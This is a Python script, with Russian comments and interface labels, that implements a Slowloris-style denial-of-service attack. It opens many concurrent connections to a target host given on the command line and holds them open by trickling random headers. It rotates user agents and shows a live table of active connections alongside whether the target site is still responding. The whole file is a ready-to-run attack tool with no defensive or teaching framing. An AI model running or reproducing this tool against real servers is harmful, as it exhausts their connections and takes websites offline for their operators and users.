import asyncio
import ssl
import random
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.layout import Layout
from rich.panel import Panel
from rich.live import Live
import aiohttp

console = Console()

USER_AGENTS = [
    # список юзер-агентов
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Android 13; Mobile; rv:115.0) Gecko/115.0 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 OPR/100.0.0.0",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36 OPR/72.1.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Brave/115.0.0.0",
    "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/115.0.0.0 Mobile Safari/537.36",
]

stats = {
    "active": 0,
    "closed": 0,
    "sent": 0,
    "errors": 0,
    "is_alive": True,
}
lock = asyncio.Lock()

async def slowloris_like_send(sock_id, host, port, interval, use_https, verbose):
    ua = random.choice(USER_AGENTS)

    while True:
        try:
            reader, writer = await open_connection_async(host, port, use_https)
            async with lock:
                stats["active"] += 1

            if verbose:
                console.log(f"[green]#{sock_id} Connected to {host}:{port}[/green]")

            initial = f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n"
            writer.write(initial.encode())
            await writer.drain()

            while True:
                await asyncio.sleep(interval)
                header = f"X-a-{random.randint(0,10000)}: keepalive\r\n"
                writer.write(header.encode())
                await writer.drain()
                async with lock:
                    stats["sent"] += 1

        except Exception:
            async with lock:
                stats["errors"] += 1
                stats["closed"] += 1
                stats["active"] = max(0, stats["active"] - 1)
            if verbose:
                console.log(f"[red]#{sock_id} Ошибка или закрытие соединения[/red]")
            await asyncio.sleep(2)
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except:
                pass

async def open_connection_async(host, port, use_https):
    if use_https:
        ssl_ctx = ssl.create_default_context()
        return await asyncio.open_connection(host=host, port=port, ssl=ssl_ctx, server_hostname=host)
    else:
        return await asyncio.open_connection(host=host, port=port)

def generate_table(url: str) -> Layout:
    table = Table(title="Информация и Статистика", expand=True)
    table.add_column("Параметр")
    table.add_column("Значение", justify="right")

    # Раздел 1: Информация о сайте
    table.add_row("[bold underline]Информация о сайте[/bold underline]", "")
    table.add_row("URL", url)
    table.add_row("Сайт работает", "[green]Да[/green]" if stats["is_alive"] else "[red]Нет[/red]")
    table.add_row("", "")  # Пустая строка для отделения разделов

    # Раздел 2: Статистика Slowloris
    table.add_row("[bold underline]Статистика Slowloris[/bold underline]", "")
    table.add_row("Активных соединений", str(stats.get("active", 0)))
    table.add_row("Закрытых соединений", str(stats.get("closed", 0)))
    table.add_row("Отправленных заголовков", str(stats.get("sent", 0)))
    table.add_row("Ошибок соединения", str(stats.get("errors", 0)))
    table.add_row("Время", datetime.now().strftime("%H:%M:%S"))

    return table

def live_display(url):
    with Live(generate_table(url), refresh_per_second=4, console=console) as live:
        import time
        while True:
            time.sleep(0.25)
            live.update(generate_table(url))

async def stats_updater(url):
    await asyncio.to_thread(live_display, url)

async def site_health_checker(host, port, use_https, interval_sec):
    url = f"{'https' if use_https else 'http'}://{host}:{port}"
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.get(url, timeout=5) as response:
                    stats["is_alive"] = 200 <= response.status < 400
            except:
                stats["is_alive"] = False
            await asyncio.sleep(interval_sec)

async def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("target")
    parser.add_argument("-p", "--port", type=int)
    parser.add_argument("-s", "--sockets", type=int, default=100)
    parser.add_argument("-i", "--interval", type=float, default=10.0)
    parser.add_argument("--protocol", choices=["http", "https"], default="http")
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("-t", "--time_check", type=int, default=3)
    args = parser.parse_args()

    port = args.port or (443 if args.protocol == "https" else 80)
    use_https = args.protocol == "https"
    url = f"{args.protocol}://{args.target}:{port}"

    tasks = [
        slowloris_like_send(i, args.target, port, args.interval, use_https, args.verbose)
        for i in range(args.sockets)
    ]
    tasks.append(site_health_checker(args.target, port, use_https, args.time_check))
    tasks.append(stats_updater(url))

    await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[red bold]Остановлено пользователем[/red bold]")
